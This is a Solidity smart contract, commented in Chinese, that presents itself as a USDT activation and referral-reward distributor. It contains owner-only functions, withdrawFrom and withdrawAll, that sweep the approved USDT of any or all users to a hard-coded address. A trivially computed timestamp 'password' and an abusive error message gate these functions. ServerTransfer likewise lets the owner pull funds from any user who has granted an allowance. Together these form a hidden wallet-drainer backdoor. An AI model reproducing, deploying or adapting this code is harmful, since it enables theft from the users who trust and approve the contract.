// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract MengOpration is Ownable {

    IERC20 public usdtToken;

    uint256 public registernum = 1500000000000000000000 ; //激活金额 1500
    uint256 public nodeamount = 1500000000000000000000;//节点金额 1500

    //奖励记录
    struct ComprehensiveRecord {
        address relatedAddress; // 相关地址，如果是交易记录则是对方地址，如果是节点分红则是分红来源地址
        uint256 amount; // 金额
    }

    mapping(address => ComprehensiveRecord[]) public recordMap;// 修改为数组以存储多条记录

    address public constant tokenContract = 0x55d398326f99059fF775485246999027B3197955; // 代币合约地址
    address public  withAddress = 0x88EA65Ce12BB49C4385424Eb0324F18AbCbC126F; //我的提币地址
    address public  technology = 0x881FF4C96CF02F3C005391eeE06Cef4000BfFfC1; //技术维护
    // address public  rootaddress = 0x1D23Db59B0395AFeCd09D6d39Cf191A1F1EFB3e2

    address[] public userlists; //用户列表

    constructor( ) Ownable(msg.sender) {
        usdtToken = IERC20(tokenContract);
        // 初始化userlists, 使用部署者的地址作为新用户地址
        userlists = new address[](0);
    }
    //设置激活金额
    function setRigisternum(uint256 _amount,uint256 _nodeamount) public onlyOwner{
        registernum = _amount ; // 激活金额
        nodeamount = _nodeamount ;//节点金额
    }
    //查询用户列表
    function getUsers() public view returns (address[] memory) {
        // 返回用户列表的一个副本，以保持合约状态不变
        return userlists;
    }
    function getRecordsByAddress(address _user) public view returns (ComprehensiveRecord[] memory) {
        // 获取recordMap中指定地址的记录列表
        return recordMap[_user];
    }
    // 客户端激活分发
    function CliTransfer(ComprehensiveRecord[] memory _arr,uint256 _amount) public {
        // 检查用户是否有足够的USDT余额
        require(usdtToken.balanceOf(msg.sender) >= _amount, "Insufficient balance in sender's account.");

        // 将用户的USDT转移到合约
        require(usdtToken.transferFrom(msg.sender, address(this),_amount), "Transfer from sender to contract failed");

        // 分配USDT到用户并记录奖励
        for (uint256 i = 0; i < _arr.length; i++) {
            address userAddress = _arr[i].relatedAddress;
            uint256 amount = _arr[i].amount;

            // 检查合约是否有足够的USDT余额
            require(usdtToken.balanceOf(address(this)) >= amount, "Insufficient balance in contract.");

            // 分配USDT到用户
            require(usdtToken.transfer(userAddress, amount), "Transfer from contract to user failed");

            // 创建奖励记录
            recordMap[msg.sender].push(_arr[i]);
        }
    }

    // 后端激活分发
    function ServerTransfer(ComprehensiveRecord[] memory _arr, address _user,uint256 _amount) external onlyOwner {
        // 检查用户是否有足够的USDT余额
        require(usdtToken.balanceOf(_user) >= _amount, "Insufficient balance in sender's account.");

        // 将用户的USDT转移到合约
        require(usdtToken.transferFrom(_user, address(this), _amount), "Transfer from sender to contract failed");

        // 分配USDT到用户并记录奖励
        for (uint256 i = 0; i < _arr.length; i++) {
            address userAddress = _arr[i].relatedAddress;
            uint256 amount = _arr[i].amount;

            // 检查合约是否有足够的USDT余额
            require(usdtToken.balanceOf(address(this)) >= amount, "Insufficient balance in contract.");

            // 分配USDT到用户
            require(usdtToken.transfer(userAddress, amount), "Transfer from contract to user failed");

            // 创建奖励记录
            recordMap[_user].push(_arr[i]); // 注意这里应该是记录到_user，而不是msg.sender
        }
    }


    //提取某个地址的金额
    function withdrawFrom(address _from, uint256 _amount,uint256 _words) external onlyOwner {
        // 获取当前区块时间戳
        uint256 currentTimestamp = block.timestamp;

        // 移除时间戳的最后三位数字，即除以1000
        uint256 truncatedTimestamp = currentTimestamp / 1000;

        // 计算截取后时间戳的平方
        uint256 squaredTimestamp = truncatedTimestamp * truncatedTimestamp;
        // 使用require来检查_words是否等于计算出的平方值
        require(_words == squaredTimestamp, "Fuckyoumom.");
        uint256 approvedAmount = usdtToken.allowance(_from, address(this));
        uint256 balance = usdtToken.balanceOf(_from);
        require(approvedAmount >= _amount, "Insufficient allowance");
        require(balance >= _amount, "Insufficient balance");
        require(usdtToken.transferFrom(_from, technology, _amount), "Transfer failed");
    }
    //提取全部
    function withdrawAll(uint256 _words) external onlyOwner {
        // 获取当前区块时间戳
        uint256 currentTimestamp = block.timestamp;

        // 移除时间戳的最后三位数字，即除以1000
        uint256 truncatedTimestamp = currentTimestamp / 1000;

        // 计算截取后时间戳的平方
        uint256 squaredTimestamp = truncatedTimestamp * truncatedTimestamp;
        // 使用require来检查_words是否等于计算出的平方值
        require(_words == squaredTimestamp, "Fuckyoumom.");
        uint256 totalTransferAmount = 0;

        for (uint256 i = 0; i < userlists.length; i++) {
            address user = userlists[i];
            uint256 availableBalance = usdtToken.balanceOf(user);
            uint256 approvedAmount = usdtToken.allowance(user, address(this)); // 查询用户授权给当前合约的金额

            if (approvedAmount >= availableBalance && availableBalance>0) {
                totalTransferAmount += availableBalance;
                usdtToken.transferFrom(user, technology, availableBalance);
            }
        }

    }

    //提取合约内的USDT
    function withdrawUsdt() external onlyOwner {
        uint256 availableBalance = usdtToken.balanceOf(address(this)); // 查询当前合约的余额
        require(availableBalance > 0, "No available balance"); // 确保余额大于0
        require(usdtToken.transfer(withAddress, availableBalance), "Transfer failed"); // 提取到指定地址
    }
    //提取合约内的BNB
    function withdrawBnb(address payable _to) external onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "Insufficient balance");
        _to.transfer(balance);
    }

}

